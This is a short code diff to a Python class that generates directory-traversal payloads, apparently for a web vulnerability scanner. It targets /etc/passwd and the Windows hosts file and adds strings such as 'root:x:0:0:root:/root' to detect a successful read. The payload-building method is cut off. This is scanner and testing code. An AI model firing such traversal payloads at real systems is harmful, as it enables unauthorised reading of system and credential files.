@@ -1,21 +1,24 @@
 import random, string
 import urllib.parse
+from pluck.module import GenerationModule
 
 
 
-
-class DirectoryTraversalPayloadGenerator():
+class DirectoryTraversalPayloadGenerator(GenerationModule):
     def __init__(self):
-        self.sleep_timeout = 15
-        self.unique_string = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(12))
-        
+        super().__init__()
 
         self.os_files = ["/etc/passwd","C:\\Windows\\System32\\drivers\\etc\\hosts"]
         self.os_paths = ["C:\\Windows\\System32\\drivers\\etc", "etc", "Windows\\System32\\drivers\\etc"]
         self.depth = 8
         self.traversal = []
 
-
+        self.success_strings = [
+            'This is a sample HOSTS file used by Microsoft',
+            'Copyright (c) 1993-2009 Microsoft Corp.',
+            'root:x:0:0:root:/root',
+        ]
+        
     # generate dot dot shashes
     def generate_traversal(self):
         traversal = ""
